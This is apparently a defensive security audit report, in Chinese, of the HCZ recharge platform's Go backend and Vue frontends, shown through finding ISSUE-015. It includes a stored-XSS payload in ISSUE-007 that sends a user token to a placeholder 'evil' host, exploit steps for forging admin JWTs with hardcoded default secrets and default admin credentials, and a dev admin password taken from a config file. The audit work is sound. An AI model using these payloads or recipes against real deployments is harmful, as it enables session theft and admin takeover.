# HCZ Full Security Audit Report

> 项目：HCZ 优惠充值平台（github.com/Aether-v1/hcz）
> 审计日期：2026-10-07
> 审计方式：全量只读静态代码审计 + 真实编译/测试执行，**零代码改动**
> 审计范围：Auth / User / Wallet / Recharge / Orders / Refund / Commission / Points / Points Mall / Admin / Site Builder / Upload / Provider / Database / Redis / Middleware / Router / Frontend API Client
> 审计维度：安全漏洞 / 隐藏 Bug / 资金链路 / SQL 注入 / 越权 IDOR / RBAC / 认证 / 2FA / 输入校验 / Mass Assignment / 信息泄露 / 敏感日志 / 文件上传 / SSRF / XSS / CORS/CSRF / 缓存 / 数据库 / Deadlock/Race / Panic / 错误处理 / 随机数 / 密码 / 配置密钥 / Rate Limit

---

## 1. Final Verdict

# BLOCKED

| 级别 | 数量 |
|------|------|
| **P0 — Critical** | **3** |
| **P1 — High** | **5** |
| **P2 — Medium** | **11** |
| **P3 — Low** | **20** |
| **合计** | **39** |

**阻断理由：**
1. **P0-编译阻断**：`internal/modules/points` 包存在缺失符号，`go build ./...` 与 `go vet ./...` 均 exit 1，生产二进制无法产出。
2. **P0-默认 JWT 密钥**：源码硬编码 `change-me-in-production` / `user-change-me-in-production`，配置缺失时仅告警不退出，攻击者可伪造任意 admin/user JWT。
3. **P0-默认超管口令**：首启未配置时创建 `admin / admin123` 超级管理员。

> 以上三项中任意一项在生产环境存在即等于完全失守。资金主链路（钱包/订单/退款/提现/支付回调）本身设计稳健，未发现可被普通用户直接利用的 P0/P1 资金漏洞。

---

## 2. Baseline

| 项 | 值 |
|----|-----|
| 路径 | `E:\Users\orang\Downloads\Compressed\hcz_v1` |
| Branch | `main` |
| HEAD | `10d6757` refactor(telegram): retire legacy bot license telemetry |
| Git 状态 | 大量已修改未提交文件（M）+ 新增未跟踪文件（??），以工作区当前代码为准 |
| Runtime | Go 1.26.5 |
| Web 框架 | Gin v1.12.0 |
| ORM | GORM v1.31.1（PostgreSQL 生产 / SQLite 测试） |
| RBAC | Casbin v3.10.0 + gorm-adapter v3.41.0 |
| 认证 | golang-jwt/jwt v5（HS256），双密钥隔离（admin / user） |
| 缓存/队列 | go-redis v9 + Asynq v0.25.1 |
| 金额库 | shopspring/decimal v1.4.0 |
| 2FA | pquerna/otp v1.5.0（TOTP） |
| 支付 | wechatpay-go v0.2.21 |
| 数据库文件 | `db/hcz.db`（SQLite，本地开发用） |
| 前端 | Vue 3.5 + vue-router 4 + Pinia 3 + Vite 7 + vue-i18n 9 + DOMPurify 3.4（admin + user 双 SPA） |
| 前端认证 | JWT Bearer Token（Authorization header），localStorage 存储，**无 Cookie 认证** |

---

## 3. Architecture

项目采用 **DDD 分层架构**，后端约 50 个业务模块，每个模块内部按 `application / domain / contract / infrastructure / transport` 分层。

```
cmd/server/main.go
  └─ internal/app/container/  (依赖注入容器)
      ├─ internal/app/httpserver/
      │   ├─ router.go              (总路由 + 全局中间件)
      │   ├─ routes_admin.go        (/api/v1/admin/*  JWT + Casbin RBAC)
      │   ├─ routes_storefront.go   (/api/v1/*        UserJWT)
      │   ├─ routes_channel.go      (/api/v1/channel/*  渠道 API Key)
      │   ├─ routes_upstream.go     (/api/v1/upstream/* 上游 HMAC)
      │   └─ middleware/             (JWT / RBAC / CORS / RateLimit / Recovery / StepUp)
      ├─ internal/modules/           (~50 个业务模块，DDD 分层)
      │   ├─ identity/    (userauth / adminauth / invitation / user / adminauthorization)
      │   ├─ wallet/      (余额 / 冻结 / 管理员调账)
      │   ├─ walletwithdrawal/ (提现申请 / 审核 / 打款)
      │   ├─ order/       (订单 / refund / aftersale / 状态机)
      │   ├─ payment/     (支付渠道 / webhook / callback)
      │   ├─ c2c/         (C2C 交易)
      │   ├─ points/ + pointsmall/ + checkin/ (积分体系，新增)
      │   ├─ affiliate/   (多级分销佣金)
      │   ├─ catalog/     (商品 / 分类 / 映射)
      │   ├─ content/     (文章 / Banner / 媒体)
      │   ├─ sitebuilder/ (站点装修)
      │   ├─ settings/    (系统配置)
      │   ├─ upload/      (文件上传)
      │   ├─ exchangerate/ (USDT 汇率)
      │   ├─ procurement/  (采购单 / 上游回调)
      │   ├─ reconciliation/ (对账)
      │   └─ ... (其余 ~30 模块)
      ├─ internal/authz/          (Casbin 策略引导)
      ├─ internal/bootstrap/      (各模块 wiring + database/migrations)
      ├─ internal/cache/          (Redis 封装)
      ├─ internal/crypto/         (AES-256-GCM)
      ├─ internal/platform/http/  (stepup / response / ginutil)
      └─ internal/queue/          (Asynq)
frontend/
  ├─ admin/   (管理后台 SPA)
  └─ user/    (用户端 SPA)
```

**关键设计特征：**
- 金额全程 `shopspring/decimal`，数据库字段 `decimal(20,2)`，无 float
- 余额操作一律事务内 `SELECT FOR UPDATE` 行锁
- 订单/退款/提现/佣金均有 reference 幂等 + 数据库 UNIQUE 约束
- 管理端全部路由挂 JWT + Casbin RBAC，Casbin 模型默认拒绝
- 用户端 user_id 一律从 JWT claims 注入 context，不可客户端伪造

---

## 4. Attack Surface

| 类别 | 路径前缀 | 认证方式 | 说明 |
|------|----------|----------|------|
| **Public API** | `/api/v1/public/*` | 无 / UserJWT（读接口叠加） | 启动配置、验证码、商品/分类/内容/会员等级公开读取 |
| **User API** | `/api/v1/auth/*` | 无（登录/注册/2FA/OAuth） | 限流保护 |
| | `/api/v1/*`（user group） | UserJWT（HS256） | 订单/钱包/提现/C2C/积分/工单/通知/分销商 |
| **Admin API** | `/api/v1/admin/login` + `/verify-2fa` | 无（限流） | 管理员登录 |
| | `/api/v1/admin/*`（其余） | AdminJWT + Casbin RBAC + Step-Up（资金操作） | 全部管理功能 |
| **Channel API** | `/api/v1/channel/*` | 渠道 API Key（HMAC） | 渠道下单/钱包/礼品卡/返利 |
| **Upstream API** | `/api/v1/upstream/*` | 上游 API Key（HMAC） | 上游回调/订单同步 |
| **Payment Callback** | 自定义路径（CallbackRouteMiddleware） | 渠道签名验证 | 支付 webhook / callback，限流 |
| **Upload** | `/api/v1/admin/upload` | AdminJWT + RBAC | 管理端文件上传 |
| | `/uploads/*` | 无（公开静态） | 上传文件静态访问，SVG 强制下载 |
| **Provider Integration** | 出站 HTTP | — | 支付网关/上游适配器/Bot 通知/下游回调/站点对接 Ping |
| **Health** | `/health` | 无 | 健康检查 |
| **Sitemap** | `/sitemap.xml` 等 | 无 | SEO 资源 |

---

## 5. Money Flow Map

### 完整资金链路

```
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. 下单 POST /api/v1/orders (UserJWT + Idempotency-Key)                │
│    请求体仅含: items[product_id, sku_id, quantity], coupon_code,        │
│    affiliate_code, channel_id, use_balance                               │
│    ✅ 无 amount/price/exchange_rate/discount 字段（客户端不可控金额）    │
├─────────────────────────────────────────────────────────────────────────┤
│ 2. 定价（事务内）                                                         │
│    ├─ 查商品/SKU → 服务端价格（catalog 读取，非客户端提交）              │
│    ├─ rateResolver.Resolve() → 全局汇率（fail-closed: AUTO→MANUAL→拒绝）│
│    ├─ decimal 换算 USDT（CEIL 2dp），订单落 ExchangeRate 快照           │
│    ├─ coupon 折扣由 coupon 服务端计算（plan.CouponDiscount）            │
│    ├─ 冻结/预留库存（cardsecret FOR UPDATE + Reserve rowsAffected 校验） │
│    ├─ 锁定 coupon、校验使用次数                                           │
│    └─ INSERT order（含 IdempotencyKey, fingerprint）                     │
│       DB 约束: orders(user_id, idempotency_key) partial UNIQUE          │
├─────────────────────────────────────────────────────────────────────────┤
│ 3. 支付 CreatePayment                                                     │
│    ├─ 在线金额 + 钱包金额拆分                                             │
│    └─ 钱包部分: ApplyOrderBalance                                        │
│       ├─ GetAccountByUserIDForUpdate (SELECT FOR UPDATE 行锁)          │
│       ├─ 校验余额 ≥ 扣款额                                                │
│       ├─ 扣减 → after < 0 则拒绝（ErrInsufficientBalance）             │
│       └─ 写 ledger, reference=order:{id}:wallet_pay (UNIQUE)           │
│       ✅ 并发双扣被行锁串行化：余额100两笔80 → 第二笔等待后余额不足拒绝  │
├─────────────────────────────────────────────────────────────────────────┤
│ 4. 支付回调（渠道 webhook）                                               │
│    ├─ HandleSyncCallback → 先 VerifyCallback 验签（webhook.go:51）     │
│    │  ✅ 验签失败直接拒绝，不可伪造回调                                    │
│    ├─ HandleCallback → 强校验: channelID / orderNo / 币种 /             │
│    │   amount == payment.Amount（回调金额必须等于订单金额）               │
│    ├─ 事务内锁 payment + order                                            │
│    ├─ 已 success → 幂等直接返回（不重复履约/退款）                       │
│    ├─ 足额 → 完成订单: 履约发卡密 + 解锁 coupon + 发积分 + 多级佣金      │
│    └─ 不足额 → 差额退入钱包 (reference=payment:{id}:underpaid_credit)   │
├─────────────────────────────────────────────────────────────────────────┤
│ 5. 订单完成 markOrderCompletedInTx                                        │
│    ├─ 履约（发卡密）                                                      │
│    ├─ affiliate HandleOrderCompletedInTx                                  │
│    │  ├─ base = WalletPaidAmount（decimal）                              │
│    │  ├─ 按层级 decimal 计算佣金                                          │
│    │  └─ (order, beneficiary, level, type) 唯一约束幂等                  │
│    └─ 积分发放（reference 幂等）                                          │
├─────────────────────────────────────────────────────────────────────────┤
│ 6. 退款（管理员 AdminManualRefund，Step-Up 保护）                        │
│    ├─ 锁订单 (GetByIDForUpdate)                                           │
│    ├─ 校验: PaidAt != nil / 退款窗口 / paidBase > 0                      │
│    ├─ ✅ 累计上限服务端强制:                                               │
│    │   refundable = paidBase - refundedBefore                             │
│    │   if amount > refundable → ErrRefundExceeded                        │
│    │   （订单100连续 refund60+refund60 → 第二笔 refundable=40 拒绝）    │
│    ├─ 更新 refunded_amount / refund_status                                │
│    ├─ affiliate HandleOrderRefunded → 按比例 REVERSAL ledger            │
│    │   ✅ 已出金(PAID)佣金转 DEBT 而非重复扣减                            │
│    ├─ 积分回滚                                                            │
│    └─ AdminRefundToWalletInTx → credit 回用户钱包                        │
│       reference = order:{id}:admin_refund:{timestamp}                    │
├─────────────────────────────────────────────────────────────────────────┤
│ 7. 提现（用户 CreateWithdrawal）                                          │
│    ├─ 强制 Idempotency-Key + TOTP + min/max + 日限 + 首提限            │
│    ├─ 事务内: 行锁账户 → 校验可用余额 → 扣减 → 写 ledger                 │
│    │   (reference 确定, UNIQUE)                                           │
│    ├─ 写提现单 pending                                                     │
│    └─ 管理员审核: Approve → MarkProcessing → Complete(打款 txid 必填)   │
│       Reject → 退回 request_amount (reference=withdrawal:refund:{id},   │
│       确定性 + UNIQUE, 幂等)                                              │
│       ✅ 提现状态机严格，自跳转拒绝，重复审批被拒                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 资金安全结论

**资金主链路设计稳健，未发现 P0/P1 级可被普通用户直接利用的资金漏洞。** 核心防护全部到位：
- 金额不可客户端伪造（下单请求无价格字段）
- 汇率不可客户端篡改（服务端解析 + 快照）
- 并发双扣被行锁串行化
- 退款累计上限服务端强制（不可能退 120）
- 支付回调先验签再强比对金额
- 佣金随退款按比例回滚
- 提现/礼品卡/调账均有幂等 + UNIQUE 约束

---

## 6. Findings

### P0 — Critical（3 项）

---

#### ISSUE-001
- **Severity: P0**
- **Title:** 硬编码默认 JWT 签名密钥，配置缺失时无启动校验，可伪造任意 admin/user 令牌
- **File:** `internal/config/config.go:315,333-335,437-441`；`internal/app/httpserver/middleware/middleware.go:185-189,436-438`
- **Function/Method:** `Load()` / `JWTAuthMiddleware` / `UserJWTAuthMiddleware`
- **API:** 任意需认证端点（含 `/api/v1/admin/**`）
- **Table:** `admins` / `users`
- **Root Cause:** viper 给 `jwt.secret` / `user_jwt.secret` / `app.secret_key` 设置了写在源码里的公开默认值 `change-me-in-production` / `user-change-me-in-production`。当 config.yml 缺失或未配置这些键时，`ReadInConfig` 失败仅打 Warn（:437-441），进程照常启动并使用这些公开密钥。全程没有"生产环境拒绝默认密钥"的校验。JWT 中间件仅用配置密钥验签（HS256 白名单正确，但挡不住"密钥本身已知"）。
- **Exploit/Trigger:**
  1. 攻击者知道源码中的默认密钥。
  2. 用该密钥 HS256 自签 `admin_id=1, typ=access, tv=0, iat=now` 的 JWT。
  3. 带上 `Authorization: Bearer <forged>` 访问 `/api/v1/admin/**`。中间件验签通过（默认密钥已知），从 DB 取 admin id=1（首启即 IsSuper=true）。TokenVersion 为"相等比较"，全新部署 TokenVersion=0，伪造 `tv=0` 即通过。
  4. 直接获得超管会话，绕过登录/2FA/step-up。
- **Impact:** 未改配置即上线的实例 = 任何人可远程获得超级管理员权限，完全失守（资金、用户、密钥全暴露）。
- **Evidence:**
  ```go
  // config.go:333-335
  viper.SetDefault("jwt.secret", "change-me-in-production")
  viper.SetDefault("user_jwt.secret", "user-change-me-in-production")
  // config.go:437-441 — 配置缺失仅告警，不退出
  if err := viper.ReadInConfig(); err != nil {
      logger.Warnw("config_file_read_failed", ...)
  }
  // middleware.go:185-189 — 仅用配置密钥验签
  return []byte(secretKey), nil
  ```
- **Recommended Fix:**
  1. 生产模式（server.mode=release）下启动时强制校验：jwt.secret / user_jwt.secret / app.secret_key 不得为空、不得等于已知默认值、长度 ≥ 32 字节，否则 panic 拒绝启动。
  2. 删除 SetDefault 里的敏感密钥默认值（给空值 + 启动校验）。
  3. config.yml.example 注释与实际行为对齐。

---

#### ISSUE-002
- **Severity: P0**
- **Title:** 首启默认超级管理员硬编码凭据 admin / admin123
- **File:** `internal/modules/identity/admin/application/bootstrap.go:13-14,37-48`
- **Function/Method:** `InitDefaultAdmin`
- **API:** `POST /api/v1/admin/login`（+ 2FA 若未绑定）
- **Table:** `admins`
- **Root Cause:** 当 `bootstrap.default_admin_password` 未配置时，首启创建的第一名管理员使用写死的口令 `admin123`，且 IsSuper=true。代码仅在 :50-53 打 warn 日志，未强制改密。
- **Exploit/Trigger:** 未显式配置 `bootstrap.default_admin_password` 即上线的实例，攻击者用 `admin / admin123` 直接登录后台；若该管理员未绑 2FA 则一步到位。
- **Impact:** 公开默认超管口令，批量扫站可直接接管。
- **Evidence:**
  ```go
  // bootstrap.go:13-14
  const defaultBootstrapUsername = "admin"
  const defaultBootstrapPassword = "admin123"
  // bootstrap.go:37-48
  if password == "" { password = defaultBootstrapPassword }
  admin := &admindomain.Admin{Username: bootstrapUsername, PasswordHash: string(hash), IsSuper: true}
  ```
- **Recommended Fix:**
  1. 首启不允许弱默认口令：未配置时随机生成一次性强密码并仅打印一次（或强制走安装向导）。
  2. 登录后强制改密流程。
  3. 部署文档把"必须配置 bootstrap.default_admin_password"列为硬性上线检查项。

---

#### ISSUE-003
- **Severity: P0**
- **Title:** points 模块编译失败，整个项目无法构建部署（工程阻断）
- **File:** `internal/modules/points/transport/http/routes.go:35`；`internal/modules/points/infrastructure/gormstore/store.go:19,37`
- **Function/Method:** `RegisterAdminRoutes` / `NewStore`
- **API:** `POST /admin/users/:id/points/compensate`
- **Table:** 不涉及（编译期）
- **Root Cause:** `routes.go` 引用了 `(*AdminHandler).CompensateUserPoints`，但 `admin_handler.go` 中并未定义该方法；同时 `*gormstore.Store` 未实现 `contract.Repository` 接口（缺方法 `ListAccounts`）。属于进行中但未完成的重构/开发状态。
- **Exploit/Trigger:** 任何 `go build ./...` / `go build -o hcz ./cmd/...` / `go test ./...` 全量构建。
- **Impact:** 生产二进制无法产出；CI 必然红；无法部署。这是阻断级工程问题。
- **Evidence:**
  ```
  internal/modules/points/transport/http/routes.go:35:52: h.CompensateUserPoints undefined
  internal/modules/points/infrastructure/gormstore/store.go:19:35:
      *Store does not implement contract.Repository (missing method ListAccounts)
  ```
- **Recommended Fix:**
  1. 在 `admin_handler.go` 中补全 `CompensateUserPoints` 方法（或临时从 routes.go:35 摘除该路由）。
  2. 在 `gormstore/store.go` 中实现 `ListAccounts`。
  3. 修复后重跑 `go build ./... && go vet ./... && go test ./...`，要求全绿。

---

### P1 — High（5 项）

---

#### ISSUE-004
- **Severity: P1**
- **Title:** system_admin 角色可自行任命/提拔超级管理员（垂直越权）
- **File:** `internal/modules/identity/adminauthorization/transport/http/admin_account_handler.go:78-87,165-174`
- **Function/Method:** `CreateAuthzAdmin` / `UpdateAuthzAdmin`
- **API:** `POST /api/v1/admin/authz/admins`；`PUT /api/v1/admin/authz/admins/:id`
- **Table:** `admins`
- **Root Cause:** 创建/更新管理员时直接采信请求体里的 `is_super`，没有像 ResetTargetAdmin2FA 那样二次校验调用方是否本身为 IsSuper。而 `/admin/authz/admins*` 策略在种子里授予了 `system_admin` 角色（非超管）。
- **Exploit/Trigger:** 任何持有 system_admin 角色的管理员：
  1. `PUT /admin/authz/admins/{自己的id}` body `{"is_super": true}` → 自己变成超管。
  2. 或 `POST /admin/authz/admins` 创建一个 `is_super:true` 的新超管后门账号。
  3. 超管身份直接绕过全部 Casbin。
- **Impact:** system_admin 本应是"管 RBAC 的系统管理员"，但可自我提权为超管，突破 RBAC 分层设计；一旦 system_admin 账号被盗即全量失守。
- **Evidence:**
  ```go
  // admin_account_handler.go:78-87 (CreateAuthzAdmin)
  isSuper := req.IsSuper != nil && *req.IsSuper
  admin := &admindomain.Admin{Username: username, PasswordHash: hash, IsSuper: isSuper}
  // admin_account_handler.go:165-174 (UpdateAuthzAdmin)
  if req.IsSuper != nil { admin.IsSuper = *req.IsSuper } // 无 IsSuperAdmin() 二次校验
  // internal/authz/bootstrap.go:320-321 — 该能力授予 system_admin（非超管）
  {Object: "/admin/authz/admins", Action: "*"},
  ```
- **Recommended Fix:** Create/UpdateAuthzAdmin 中设置 is_super 前必须 `ginutil.IsSuperAdmin(c)` 为真；把"任命超管"动作收归超管专属；对 is_super 变更单独记审计并告警。

---

#### ISSUE-005
- **Severity: P1**
- **Title:** Step-Up 端点无速率限制、无失败计数，可在线暴力破解 6 位 TOTP
- **File:** `internal/modules/identity/adminauth/transport/http/admin_2fa_handler.go`（StepUp）；`internal/modules/identity/adminauth/transport/http/routes.go:35`
- **Function/Method:** `StepUp`
- **API:** `POST /api/v1/admin/auth/step-up`
- **Table:** `admins`（TOTPSecret）
- **Root Cause:** StepUp 直接调用 `totp.VerifyChallengeCode`，既没有登录 2FA 链路的 `BumpFails/5 次吊销 challenge`，路由也未挂 RateLimitMiddleware。TOTP 为 6 位数字、skew=1（前后各放宽 1 个 30s 窗口，约 90s 有效窗口）。
- **Exploit/Trigger:** 攻击者已取得一个超管/财务的 access token（如 XSS、内鬼、终端失陷），但高风险操作（钱包调账/提现审批/退款）要求 step-up 第二因子。此时对 `/auth/step-up` 无限速地枚举 6 位 TOTP 即可绕过第二因子。
- **Impact:** 2FA/step-up 这道"第二道锁"可被在线爆破，削弱资金操作的二次验证强度。
- **Evidence:**
  ```go
  // routes.go:35 — 无 RateLimit 包裹
  authorized.POST("/auth/step-up", handler.StepUp)
  // StepUp：失败仅 401，未见 BumpFails / challenge 吊销计数
  if err := h.totp.VerifyChallengeCode(adminID, code); err != nil { ... 401 ... }
  // 对比：登录 2FA Verify2FA 才有 challengeMaxFailures=5 的 BumpFails/Revoke
  ```
- **Recommended Fix:** 给 `/admin/auth/step-up` 挂 RateLimitMiddleware（KeyByAdminID，如 10 次/5 分钟）；在 StepUp 内引入与登录一致的失败计数：连续失败 N 次吊销 challenge。

---

#### ISSUE-006
- **Severity: P1**
- **Title:** 上传接口 scene=telegram 跳过扩展名与 MIME 白名单，运营管理员可上传任意 HTML/JS 并托管在站点同源静态目录
- **File:** `internal/modules/upload/application/service.go:73-78,102-113,155`；`internal/modules/upload/transport/http/admin_handler.go:48`；`internal/app/httpserver/router.go:329-333`
- **Function/Method:** `SaveFileWithMeta` / `UploadFile`
- **API:** `POST /api/v1/admin/upload`（form 字段 `scene=telegram`）
- **Table:** `content_media`；物理落盘 `uploads/telegram/<year>/<month>/<uuid><ext>`
- **Root Cause:** 上传校验在扩展白名单与 MIME 白名单两处都用 `if normalizedScene != "telegram"` 短路。`telegram` 场景本意为 Bot 渠道接收多种文件类型，但被复用到管理端上传端点（AdminHandler 直接接受前端传入的 `scene`，仅做 normalize）。任何拥有 `/admin/upload` POST 权限的角色（内置 `operations`）都能绕过"仅图片"限制，上传 `.html/.htm` 等可被浏览器渲染的文件。静态服务仅对 `.svg` 强制下载，对 `.html` 不做任何处理。
- **Exploit/Trigger:**
  1. operations 管理员登录后台。
  2. `POST /api/v1/admin/upload`，file 选 `evil.html`（含 `<script>偷 token/伪造请求</script>`），form 字段 `scene=telegram`。
  3. 扩展名白名单被跳过（:74）；MIME 白名单被跳过（:102）；文件以 `uploads/telegram/2026/10/<uuid>.html` 落盘。
  4. 静态服务按扩展名返回 `text/html`，浏览器直接执行脚本。
- **Impact:** 同源存储型 HTML/JS 托管。恶意 operations 账号或被攻破的运营账号可在受信任站点源上放置钓鱼/窃取会话页面，诱导用户访问即可劫持前台用户会话。
- **Evidence:**
  ```go
  // service.go:73-78
  if normalizedScene != "telegram" && len(s.policy.AllowedExtensions) > 0 {
      if ext == "" || !isAllowedExtension(ext, s.policy.AllowedExtensions) { return ... }
  }
  // :102-113 同样对 telegram 跳过 MIME 白名单
  // admin_handler.go:48
  scene := c.DefaultPostForm("scene", "common")
  // router.go:329-333 仅 .svg 被强制下载，.html 不在保护范围
  ```
- **Recommended Fix:** 管理端上传端点不应信任前端传入的 `scene`：按端点固定 scene（如 `/admin/upload` 固定 `common`），或在 admin handler 层拒绝 `scene=telegram`；对 `telegram` 场景至少保留 MIME 白名单；在静态服务层对 `.html/.htm/.xml` 等危险扩展名统一加 `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`。

---

#### ISSUE-007
- **Severity: P1**
- **Title:** 商品 JSON-LD 结构化数据存在 `</script>` 标签逃逸，可被商品标题/描述注入存储型 XSS
- **File:** `frontend/user/src/composables/useProductDetail.ts:608-631`
- **Component/Function:** `useProductDetail()` → useHead script payload
- **API:** `GET /api/v1/products/:slug`（商品数据，含 `title` / `seo_meta.description`）
- **Root Cause:** `JSON.stringify(jsonLd)` 直接作为 `<script type="application/ld+json">` 的 `innerHTML` 注入。`JSON.stringify` **不会转义 `</script>` 序列**。当商品标题（管理员录入，或分销商可编辑）包含 `</script><script>...</script>` 时，浏览器 HTML 解析器在第一个 `</script>` 处提前结束脚本块，其后的内容变成可执行脚本。
- **Exploit/Trigger:**
  1. 管理员/有权限的分销商把商品名设为：`x</script><script>fetch('https://evil/?t='+localStorage.getItem('user_token'))<\/script>`
  2. 任一用户打开该商品详情页，脚本执行，`user_token` 被外带 → 该用户账号被接管。
- **Impact:** 存储型 XSS，影响面 = 该商品详情页全部访客；与 ISSUE-013（token 在 localStorage）组合即全量会话窃取。多租户场景下单个分销商可借此投毒所有访问其店铺的用户。
- **Evidence:**
  ```ts
  // useProductDetail.ts:608-631
  const jsonLd = { '@context': '...', '@type': 'Product', name: title, ... }
  if (description) jsonLd.description = description
  return [{ type: 'application/ld+json', innerHTML: JSON.stringify(jsonLd) }]
  // ← 未转义 </script>
  ```
- **Recommended Fix:** 序列化后把 `<` 全部转义为 `\u003c`：`JSON.stringify(jsonLd).replace(/</g, '\\u003c')`；后端对商品名/SEO 描述中 `</` 序列做拒绝或转义（纵深防御）。

---

#### ISSUE-008
- **Severity: P1**
- **Title:** 工作区 config.yml 含真实密钥与默认管理员弱口令（部署配置泄露面）
- **File:** `config.yml`（当前工作区，2722 字节）
- **Root Cause:** `config.yml` 中存在已填好的 `app.secret_key`、`jwt.secret`、`user_jwt.secret`，以及 `bootstrap.default_admin_password: "HczDev@2026"`。
- **Impact:** 若该文件被随镜像/部署包分发，或服务器被读，攻击者可直接伪造 JWT 并以默认口令登录管理员后台。
- **Evidence（仅定性）:** `config.yml` 命中 `secret_key` / `jwt.secret` / `user_jwt.secret` / `bootstrap.default_admin_password` 均为非占位真实值。`.gitignore:10` 已正确排除 `config.yml`；`git ls-files` 确认未被 git 跟踪；`git log --all -- config.yml` 为空——**历史无泄露**。
- **Recommended Fix:** 生产环境必须通过环境变量/secret 管理注入，禁止把含真实 secret 的 config.yml 带入镜像；首次启动后立即修改默认管理员口令；轮换当前 secret_key / jwt.secret（因工作区已暴露在本地，按"已泄露"处置更稳妥）。

---

### P2 — Medium（11 项）

---

#### ISSUE-009
- **Severity: P2**
- **Title:** CORS 配置 `allowed_origins: ["*"]` 与 `allow_credentials: true` 同时开启
- **File:** `internal/app/httpserver/middleware/middleware.go:80-101`；`internal/config/config.go:379-383`；`config.yml`（cors 段）
- **API:** 全站
- **Root Cause:** 当 allowedOrigins 含 `*` 且 allowCredentials=true 时，中间件把请求方 Origin 原样回显为 `Access-Control-Allow-Origin`，并同时下发 `Access-Control-Allow-Credentials: true`。
- **Impact:** 当前认证走 Authorization: Bearer（localStorage），浏览器不会自动携带，实际可利用性下降；但系统存在 OAuth/支付回调等 Cookie 链路，且一旦某处改用 Cookie 会话即立刻变成完整 CSRF/跨域读。默认值不安全。
- **Recommended Fix:** 生产环境把 `allowed_origins` 显式枚举为前端实际域名列表；allow_credentials=true 时拒绝 `*`，强制精确 Origin 匹配。

---

#### ISSUE-010
- **Severity: P2**
- **Title:** 登录接口通过差异化错误码造成用户枚举
- **File:** `internal/modules/identity/userauth/application/service.go`（LoginStep1）；`internal/modules/identity/userauth/transport/http/user_login_handler.go`
- **API:** `POST /api/v1/auth/login`
- **Root Cause:** 服务层对"账号不存在""账号未验证""账号被冻结""密码错"返回不同错误，handler 映射为不同文案。
- **Impact:** 攻击者可据此区分邮箱是否注册、账号当前状态，辅助撞库与定向钓鱼。
- **Recommended Fix:** 对外统一返回"邮箱或密码错误"，把 disabled/unverified 仅在登录成功后按需提示。

---

#### ISSUE-011
- **Severity: P2**
- **Title:** 登录限流键为 email|IP，单 IP 可对大量账号做密码喷洒
- **File:** `internal/app/httpserver/middleware/rate_limit.go:271-277`
- **API:** `POST /api/v1/auth/login`
- **Root Cause:** 登录限流桶键 = `邮箱|IP`。同一 IP 尝试 N 个不同邮箱时，每个邮箱独立成桶，互不影响。
- **Impact:** 攻击者从一个 IP 对 10 万个邮箱各试 1-2 个常见密码，每个桶都未触发上限，完成大规模喷洒。
- **Recommended Fix:** 增加纯 IP 维度的全局登录次数上限（如 1 分钟 60 次）作为第二道闸；服务层增加按账号的失败锁定。

---

#### ISSUE-012
- **Severity: P2**
- **Title:** C2C 仲裁的 Step-Up 校验弱于平台标准（不绑 scope、不消费 challenge、可重放）
- **File:** `internal/modules/c2c/transport/http/admin_handler.go:~253`；`internal/bootstrap/c2c/wiring.go`
- **API:** `POST /api/v1/admin/c2c/orders/:id/arbitrate`
- **Root Cause:** 平台 stepup.Verifier 会校验 scope 绑定并用 SETNX 单次消费 challenge；但 C2C 仲裁改用 `adminChallengeVerifier.ParseChallengeToken`，只校验 token 里的 admin_id，与 scope 无关，且从不调用 ConsumeChallenge。
- **Impact:** challenge 有效期 5 分钟内，同一 challenge token 可多次用于不同仲裁；为别的 scope 签发的合法 challenge 也能用于 C2C 仲裁。step-up 在 C2C 仲裁场景失去"单次 + 绑定操作"的强度。
- **Recommended Fix:** C2C 仲裁改用统一 stepup.Verifier，显式声明 scope（如 "c2c.arbitrate"）并强制消费 challenge。

---

#### ISSUE-013
- **Severity: P2**
- **Title:** 无服务端登出，令牌在有效期内（admin 24h / user 24-168h）被盗后无法吊销
- **File:** `internal/modules/identity/adminauth/transport/http/routes.go`；userauth 路由
- **Root Cause:** 没有 logout 接口，也无令牌黑名单。吊销只能依赖 TokenVersion++（仅改密/重置密码/管理员冻结用户时触发）。退出登录仅前端删 token。
- **Impact:** XSS/机器失陷拿到 token 后，用户即使"退出登录"也无法使其失效；被盗 token 最长可用 7 天（remember_me）。
- **Recommended Fix:** 增加 logout 端点：服务端把当前 jti 写入短期黑名单（或 bump TokenVersion）；缩短 access token 有效期并引入 refresh token + 可撤销 refresh 轮换。

---

#### ISSUE-014
- **Severity: P2**
- **Title:** API 凭证 secret 明文落库
- **File:** `internal/modules/apicredential/application/service.go:111-112`；`internal/modules/apicredential/domain/credential.go:14`
- **Table:** `api_credentials`
- **Root Cause:** api_secret 以明文存入 DB（HMAC 校验需要可逆明文）。API 响应 `json:"-"` 不回显，但 DB 一旦泄露（备份拖库/SQLi），全部对接方密钥直接暴露。
- **Impact:** 数据库泄露放大为 API 身份冒用。
- **Recommended Fix:** 与 channel/upstream secret 统一加密存储（复用 crypto.Encrypt AES-256-GCM，用 app.secret_key 派生），使用时解密。

---

#### ISSUE-015
- **Severity: P2**
- **Title:** 客服工单附件缺少上传者归属，可跨用户引用并下载他人附件
- **File:** `internal/modules/supportticket/domain/attachment.go`；`internal/modules/supportticket/application/user_service.go`（`linkAttachmentsToMessage` / `UploadAttachment` / `DownloadAttachment`）
- **API:** `POST /api/v1/support/attachments`；`POST /api/v1/support/tickets`（attachment_ids）；`GET /api/v1/support/attachments/:id/download`
- **Table:** `support_attachments`
- **Root Cause:**
  1. `Attachment` 领域模型**根本没有「上传者 user_id」字段**，只有 `UploaderType`（user/admin）。
  2. `UploadAttachment` 落库时 `TicketID=0`，不记录是谁上传的。
  3. `linkAttachmentsToMessage` 只校验 `att.TicketID == 0` 与 `att.UploaderType == 当前 uploaderType`，**从不校验附件是否由当前 user 上传**。
  4. `DownloadAttachment` 的归属校验是「附件 → 所属 ticket → ticket.UserID」。一旦攻击者把受害者的附件挂到自己名下的工单，下载被放行。
- **Exploit/Trigger:**
  1. 受害者上传敏感文件（身份证/截图），得到 attachment id=N（`ticket_id=0`）。
  2. 攻击者新建工单，`attachment_ids` 填入 `[N]`（顺序自增整数，可枚举附近值）。
  3. `linkAttachmentsToMessage` 判定通过，把附件 N 链接到攻击者工单。
  4. 攻击者 GET `/support/attachments/N/download` → ticket 归攻击者 → 下载成功。
- **Impact:** 跨用户敏感文件读取（ID 证件、支付截图等）。受限于顺序 id 枚举 + 未关联窗口，定级 P2。
